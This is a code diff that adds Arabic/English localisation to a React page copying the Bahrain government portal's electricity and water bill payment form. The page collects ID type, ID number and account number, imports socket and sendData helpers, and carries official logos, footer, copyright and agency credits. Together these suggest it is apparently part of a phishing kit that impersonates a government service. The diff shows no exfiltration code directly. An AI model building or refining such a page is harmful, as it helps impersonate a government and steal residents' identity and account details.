@@ -1,9 +1,11 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { navigateToPage, sendData, socket } from "@/lib/store";
+import { useLanguage } from "@/lib/language";
 
 export default function HomePage() {
   const [, setLocation] = useLocation();
+  const { lang, toggleLang, t, dir } = useLanguage();
   const [idType, setIdType] = useState("");
   const [idNumber, setIdNumber] = useState("");
   const [accountNumber, setAccountNumber] = useState("");
@@ -46,12 +48,12 @@ export default function HomePage() {
   };
 
   const getWeatherDesc = (code: number) => {
-    if (code <= 1) return 'صافي';
-    if (code <= 3) return 'غائم جزئياً';
-    if (code <= 48) return 'غائم';
-    if (code <= 67) return 'ممطر';
-    if (code <= 77) return 'ثلوج';
-    return 'عاصف';
+    if (code <= 1) return t('clear');
+    if (code <= 3) return t('partly_cloudy');
+    if (code <= 48) return t('cloudy');
+    if (code <= 67) return t('rainy');
+    if (code <= 77) return lang === 'ar' ? 'ثلوج' : 'Snow';
+    return t('stormy');
   };
 
   const getWeatherEmoji = (code: number) => {
@@ -151,7 +153,7 @@ export default function HomePage() {
           outline: 0;
         }
         .bh-page {
-          direction: rtl;
+          direction: ${dir};
           min-height: 100vh;
           background: #FAFAFA;
           color: #17171C;
@@ -988,8 +990,8 @@ export default function HomePage() {
                   onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                 />
               </div>
-              <div className="bh-lang">
-                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>English</span>
+              <div className="bh-lang" onClick={toggleLang}>
+                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }} onClick={toggleLang}>{t('lang_toggle')}</span>
                 <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="2.5">
                   <circle cx="16" cy="16" r="14"/>
                   <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
@@ -1003,13 +1005,13 @@ export default function HomePage() {
             {/* Row 2: Tabs + Actions */}
             <div className="bh-header-row2">
               <div className="bh-tabs-row">
-                <span className={`bh-tab ${activeTab === 0 ? 'active' : ''}`} onClick={() => setActiveTab(0)}>الخدمات الإلكترونية</span>
-                <span className={`bh-tab ${activeTab === 1 ? 'active' : ''}`} onClick={() => setActiveTab(1)}>دليل المعلومات</span>
+                <span className={`bh-tab ${activeTab === 0 ? 'active' : ''}`} onClick={() => setActiveTab(0)}>{t('electronic_services')}</span>
+                <span className={`bh-tab ${activeTab === 1 ? 'active' : ''}`} onClick={() => setActiveTab(1)}>{t('information_guide')}</span>
               </div>
               <div className="bh-header-actions" style={{ position: 'relative' }}>
                 <img src="/accessibility-icon.svg" alt="إمكانية الوصول" style={{ width: '24px', height: '24px', cursor: 'pointer' }} />
                 <img ref={weatherBtnRef} src="/weather-icon.svg" alt="الطقس" style={{ width: '32px', height: '32px', cursor: 'pointer' }} onClick={() => { setShowWeather(!showWeather); if (!weatherData) fetchWeather(); }} />
-                <span ref={loginBtnRef} className="bh-login-btn" onClick={() => setShowLoginPopup(!showLoginPopup)} style={{ cursor: 'pointer' }}>تسجيل الدخول</span>
+                <span ref={loginBtnRef} className="bh-login-btn" onClick={() => setShowLoginPopup(!showLoginPopup)} style={{ cursor: 'pointer' }}>{t('login')}</span>
 
                 {(showLoginPopup || showWeather) && (
                   <div className="popup-overlay-mobile" onClick={() => { setShowLoginPopup(false); setShowWeather(false); }} style={{
@@ -1056,7 +1058,7 @@ export default function HomePage() {
                       color: '#003366',
                       fontWeight: 'bold',
                       lineHeight: 1.8,
-                    }}>بإمكانك الدفع من خلال خدمة الدفع السريع أدناه</p>
+                    }}>{t('login_popup_msg')}</p>
                   </div>
                 )}
 
@@ -1081,20 +1083,20 @@ export default function HomePage() {
                           <div className="weather-current-desc">{weatherData.condition}</div>
                           <div className="weather-current-row">
                             <div className="weather-info-col">
-                              <div>الصغرى</div>
+                              <div>{t('min_temp')}</div>
                               <div className="weather-val">{weatherData.minTemp}°</div>
-                              <div>الرطوبة</div>
+                              <div>{t('humidity')}</div>
                               <div className="weather-val">{weatherData.humidity} %</div>
                             </div>
                             <div className="weather-info-col weather-main-temp">
                               <div className="weather-big-temp">{weatherData.currentTemp} °C</div>
-                              <div>شروق الشمس</div>
+                              <div>{t('sunrise')}</div>
                               <div className="weather-val">{weatherData.sunrise}</div>
                             </div>
                             <div className="weather-info-col">
-                              <div>العظمى</div>
+                              <div>{lang === 'ar' ? 'العظمى' : 'Max'}</div>
                               <div className="weather-val">{weatherData.maxTemp}°</div>
-                              <div>غروب الشمس</div>
+                              <div>{lang === 'ar' ? 'غروب الشمس' : 'Sunset'}</div>
                               <div className="weather-val">{weatherData.sunset}</div>
                             </div>
                           </div>
@@ -1111,11 +1113,11 @@ export default function HomePage() {
                           ))}
                         </div>
                         <div className="weather-link">
-                          لمزيد من المعلومات : <a href="https://www.bahrainweather.gov.bh/ar/" target="_blank" rel="noopener noreferrer">bahrainweather.gov.bh</a> ↗
+                          {t('more_info')} <a href="https://www.bahrainweather.gov.bh/ar/" target="_blank" rel="noopener noreferrer">bahrainweather.gov.bh</a> ↗
                         </div>
                       </>
                     ) : (
-                      <div style={{ textAlign: 'center', padding: '30px', background: 'linear-gradient(180deg, #3a8fd4 0%, #7ec4f5 100%)', color: '#fff' }}>جاري التحميل...</div>
+                      <div style={{ textAlign: 'center', padding: '30px', background: 'linear-gradient(180deg, #3a8fd4 0%, #7ec4f5 100%)', color: '#fff' }}>{t('loading')}</div>
                     )}
                   </div>
                 )}
@@ -1128,10 +1130,10 @@ export default function HomePage() {
         <div className="bh-nav">
           <div className="bh-container">
             <div className="bh-nav-items">
-              <a className={`bh-nav-item ${activeNavItem === 0 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(0)}>الصفحة الرئيسية</a>
-              <a className={`bh-nav-item ${activeNavItem === 1 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(1)}>الخدمات الإلكترونية حسب التصنيف</a>
-              <a className={`bh-nav-item ${activeNavItem === 2 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(2)}>الخدمات الإلكترونية حسب المقدم</a>
-              <a className={`bh-nav-item ${activeNavItem === 3 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(3)}>متجر تطبيقات الحكومة الإلكترونية</a>
+              <a className={`bh-nav-item ${activeNavItem === 0 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(0)}>{t('home_page')}</a>
+              <a className={`bh-nav-item ${activeNavItem === 1 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(1)}>{t('services_by_category')}</a>
+              <a className={`bh-nav-item ${activeNavItem === 2 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(2)}>{t('services_by_provider')}</a>
+              <a className={`bh-nav-item ${activeNavItem === 3 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(3)}>{t('gov_app_store')}</a>
             </div>
           </div>
         </div>
@@ -1147,14 +1149,14 @@ export default function HomePage() {
         <div className="bh-container">
           {/* Title row */}
           <div className="bh-content-header">
-            <h2 className="bh-content-title">دفع فاتورة الكهرباء والماء</h2>
+            <h2 className="bh-content-title">{t('pay_ewa_bill')}</h2>
             <div className="bh-menu-link">
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4B4B57" strokeWidth="3" strokeLinecap="round">
                 <line x1="3" y1="6" x2="21" y2="6"/>
                 <line x1="3" y1="12" x2="21" y2="12"/>
                 <line x1="3" y1="18" x2="21" y2="18"/>
               </svg>
-              <span>القائمة</span>
+              <span>{t('menu')}</span>
             </div>
           </div>
 
@@ -1166,19 +1168,19 @@ export default function HomePage() {
                 <line x1="12" y1="11" x2="12" y2="17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                 <circle cx="12" cy="8" r="1" fill="white"/>
               </svg>
-              <span>اضغط هنا لعرض التعليمات</span>
+              <span>{t('click_instructions')}</span>
             </div>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
           </div>
 
           {/* Required text */}
           <div className="bh-required-text">
-            <span style={{ color: '#A70717' }}>*</span> بيانات مطلوبة
+            <span style={{ color: '#A70717' }}>*</span> {t('required_data')}
           </div>
 
           {/* Blue bar: Customer details */}
           <div className="bh-blue-bar">
-            <span>تفاصيل العميل</span>
+            <span>{t('client_details')}</span>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
           </div>
 
@@ -1186,7 +1188,7 @@ export default function HomePage() {
           <div className="bh-form-area">
             <div className="bh-form-row">
               <label className="bh-form-label">
-                <span className="required">*</span> نوع الهوية:
+                <span className="required">*</span> {t('id_type')}
               </label>
               <select
                 className="bh-form-select"
@@ -1209,18 +1211,18 @@ export default function HomePage() {
                   }
                 }}
               >
-                <option value="">-- اختر نوع الهوية --</option>
-                <option value="emirati">الرقم الشخصي الإماراتي</option>
-                <option value="bahraini">الرقم الشخصي البحريني</option>
-                <option value="saudi">الرقم الشخصي السعودي</option>
-                <option value="omani">الرقم الشخصي العماني</option>
-                <option value="qatari">الرقم الشخصي القطري</option>
-                <option value="kuwaiti">الرقم الشخصي الكويتي</option>
-                <option value="owners_union">رقم اتحاد الملاك</option>
-                <option value="gov_entity">رقم الجهة الحكومية</option>
-                <option value="passport">رقم الجواز</option>
-                <option value="commercial_reg">رقم السجل التجاري</option>
-                <option value="establishment">رقم المنشأة</option>
+                <option value="">{t('select_id_type')}</option>
+                <option value="emirati">{t('emirati_id')}</option>
+                <option value="bahraini">{t('bahraini_id')}</option>
+                <option value="saudi">{t('saudi_id')}</option>
+                <option value="omani">{t('omani_id')}</option>
+                <option value="qatari">{t('qatari_id')}</option>
+                <option value="kuwaiti">{t('kuwaiti_id')}</option>
+                <option value="owners_union">{t('owners_union')}</option>
+                <option value="gov_entity">{t('gov_entity')}</option>
+                <option value="passport">{t('passport')}</option>
+                <option value="commercial_reg">{t('commercial_reg')}</option>
+                <option value="establishment">{t('establishment')}  </option>
               </select>
             </div>
 
@@ -1243,7 +1245,7 @@ export default function HomePage() {
               <>
                 <div className="bh-form-row">
                   <label className="bh-form-label">
-                    <span className="required">*</span> رقم الهوية:
+                    <span className="required">*</span> {t('id_number')}
                   </label>
                   <input
                     className="bh-form-input"
@@ -1256,7 +1258,7 @@ export default function HomePage() {
                 </div>
                 <div className="bh-form-row">
                   <label className="bh-form-label">
-                    <span className="required">*</span> رقم الحساب:
+                    <span className="required">*</span> {t('account_number')}
                   </label>
                   <input
                     className="bh-form-input"
@@ -1280,17 +1282,17 @@ export default function HomePage() {
                   onClick={handleSubmit}
                   disabled={isSubmitting || !idNumber || !accountNumber}
                 >
-                  {isSubmitting ? 'جاري المعالجة...' : 'ارسال'}
+                  {isSubmitting ? t('loading') : t('submit')}
                 </button>
                 <button
                   className="bh-btn-primary"
                   onClick={() => { setIdNumber(""); setAccountNumber(""); }}
                 >
-                  مسح
+                  {lang === 'ar' ? 'مسح' : 'Clear'}
                 </button>
               </>
             )}
-            <button className="bh-btn-back" onClick={() => { setIdType(""); setIdNumber(""); setAccountNumber(""); setShowFormFields(false); }}>رجوع</button>
+            <button className="bh-btn-back" onClick={() => { setIdType(""); setIdNumber(""); setAccountNumber(""); setShowFormFields(false); }}>{t('back')}</button>
           </div>
         </div>
 
@@ -1304,42 +1306,42 @@ export default function HomePage() {
             <div className="bh-footer-columns">
               {/* Column 1: دليل المعلومات */}
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">دليل المعلومات</div>
+                <div className="bh-footer-col-title">{t('information_guide')}</div>
                 <ul>
-                  <li><a>هنا في البحرين</a></li>
-                  <li><a>عن البحرين</a></li>
-                  <li><a>اكتشف البحرين</a></li>
-                  <li><a>دليل الخدمات الحكومية</a></li>
-                  <li><a>الدليل الحكومي</a></li>
-                  <li><a>الذكاء الاصطناعي في البحرين</a></li>
-                  <li><a>دليل خدمة العملاء</a></li>
-                  <li><a>أرقام الطوارئ</a></li>
+                  <li><a>{lang === 'ar' ? 'هنا في البحرين' : 'Here in Bahrain'}</a></li>
+                  <li><a>{t('about_bahrain_link')}</a></li>
+                  <li><a>{t('discover_bahrain')}</a></li>
+                  <li><a>{t('gov_services_guide')}</a></li>
+                  <li><a>{t('gov_guide')}</a></li>
+                  <li><a>{t('ai_bahrain')}</a></li>
+                  <li><a>{t('customer_service_guide')}</a></li>
+                  <li><a>{lang === 'ar' ? 'أرقام الطوارئ' : 'Emergency Numbers'}</a></li>
                 </ul>
               </div>
               {/* Column 2: الخدمات الإلكترونية */}
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">الخدمات الإلكترونية</div>
+                <div className="bh-footer-col-title">{t('electronic_services')}</div>
                 <ul>
-                  <li><a>تصنيف الخدمات الإلكترونية</a></li>
-                  <li><a>مقدمو الخدمات الإلكترونية</a></li>
-                  <li><a>متجر تطبيقات الهواتف</a></li>
-                  <li><a>دليل المستخدم</a></li>
-                  <li><a>المفتاح الإلكتروني 2.0 المطوّر</a></li>
-                  <li><a>مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية</a></li>
+                  <li><a>{lang === 'ar' ? 'تصنيف الخدمات الإلكترونية' : 'eServices Classification'}</a></li>
+                  <li><a>{lang === 'ar' ? 'مقدمو الخدمات الإلكترونية' : 'eServices Providers'}</a></li>
+                  <li><a>{lang === 'ar' ? 'متجر تطبيقات الهواتف' : 'Mobile Apps Store'}</a></li>
+                  <li><a>{lang === 'ar' ? 'دليل المستخدم' : 'User Guide'}</a></li>
+                  <li><a>{lang === 'ar' ? 'المفتاح الإلكتروني 2.0 المطوّر' : 'eKey 2.0'}</a></li>
+                  <li><a>{lang === 'ar' ? 'مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية' : 'Service Center Locations & Self-Service Kiosks'}</a></li>
                 </ul>
               </div>
               {/* Column 3: روابط سريعة */}
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">روابط سريعة</div>
+                <div className="bh-footer-col-title">{lang === 'ar' ? 'روابط سريعة' : 'Quick Links'}</div>
                 <ul>
-                  <li><a>حول البوابة الوطنية</a></li>
-                  <li><a>إحصائيات قنوات الخدمة</a></li>
-                  <li><a>المشاركة الإلكترونية "شاركنا"</a></li>
-                  <li><a>الأخبار الحكومية</a></li>
-                  <li><a>أخبار البحرين</a></li>
-                  <li><a>تقويم البحرين</a></li>
-                  <li><a>فعاليات تقنية المعلومات</a></li>
-                  <li><a>الإشادات والجوائز</a></li>
+                  <li><a>{lang === 'ar' ? 'حول البوابة الوطنية' : 'About the National Portal'}</a></li>
+                  <li><a>{lang === 'ar' ? 'إحصائيات قنوات الخدمة' : 'Service Channel Statistics'}</a></li>
+                  <li><a>{lang === 'ar' ? 'المشاركة الإلكترونية "شاركنا"' : 'eParticipation'}</a></li>
+                  <li><a>{lang === 'ar' ? 'الأخبار الحكومية' : 'Government News'}</a></li>
+                  <li><a>{lang === 'ar' ? 'أخبار البحرين' : 'Bahrain News'}</a></li>
+                  <li><a>{lang === 'ar' ? 'تقويم البحرين' : 'Bahrain Calendar'}</a></li>
+                  <li><a>{lang === 'ar' ? 'فعاليات تقنية المعلومات' : 'IT Events'}</a></li>
+                  <li><a>{lang === 'ar' ? 'الإشادات والجوائز' : 'Awards & Recognition'}</a></li>
                 </ul>
               </div>
             </div>
@@ -1352,7 +1354,7 @@ export default function HomePage() {
             <div className="bh-footer-social-inner">
               <img src="/bahrain_2030.png" alt="البحرين 2030" style={{ height: '160px', objectFit: 'contain' }} />
               <div className="bh-footer-social-right" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
-                <span className="bh-footer-contact-title">تابعونا</span>
+                <span className="bh-footer-contact-title">{t('follow_us')}</span>
                 <div className="bh-footer-social-icons">
                   <a title="LinkedIn">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
@@ -1372,12 +1374,12 @@ export default function HomePage() {
                 </div>
               </div>
               <div className="bh-footer-social-left">
-                <div className="bh-footer-contact-title">تواصل معنا</div>
+                <div className="bh-footer-contact-title">{t('contact_us')}</div>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                   <img src="/tawasul-logo.png" alt="تواصل" style={{ height: '55px', objectFit: 'contain' }} />
                   <div>
                     <div className="bh-footer-contact-number">80008001</div>
-                    <div className="bh-footer-contact-sub">مركز اتصال الخدمات الحكومية</div>
+                    <div className="bh-footer-contact-sub">{lang === 'ar' ? 'مركز اتصال الخدمات الحكومية' : 'Government Services Call Center'}</div>
                   </div>
                 </div>
               </div>
@@ -1388,29 +1390,29 @@ export default function HomePage() {
         {/* Footer Bottom Links */}
         <div className="bh-footer-bottom-links">
           <div className="bh-container">
-            <a>شروط الإستخدام</a>
+            <a>{t('terms_of_use')}</a>
             <span className="separator">|</span>
-            <a>سياسة الخصوصية</a>
+            <a>{t('privacy_policy')}</a>
             <span className="separator">|</span>
-            <a>إمكانية الوصول</a>
+            <a>{t('accessibility')}</a>
             <span className="separator">|</span>
-            <a>الأسئلة الشائعة</a>
+            <a>{t('faq')}</a>
             <span className="separator">|</span>
-            <a>مساعدة</a>
+            <a>{t('help')}</a>
             <span className="separator">|</span>
-            <a>تواصل معنا</a>
+            <a>{t('contact_link')}</a>
             <span className="separator">|</span>
-            <a>خريطة الموقع</a>
+            <a>{t('sitemap')}</a>
           </div>
         </div>
 
         {/* Footer Copyright */}
         <div className="bh-footer-copyright">
           <div className="bh-container">
-            <p>آخر تحديث على البوابة الوطنية : السبت، 7 مارس 2026</p>
-            <p>تم التطوير من قبل <a>هيئة المعلومات والحكومة الإلكترونية</a></p>
-            <p>حقوق الطبع &copy; 2026 مملكة البحرين</p>
-            <p>جميع الحقوق محفوظة</p>
+            <p>{t('last_update')} {lang === 'ar' ? 'السبت، 7 مارس 2026' : 'Saturday, March 7, 2026'}</p>
+            <p>{t('developed_by')} <a>{t('iga')}</a></p>
+            <p>{t('copyright')} 2026 {t('kingdom_of_bahrain')}</p>
+            <p>{t('all_rights_reserved')}</p>
           </div>
         </div>
       </div>
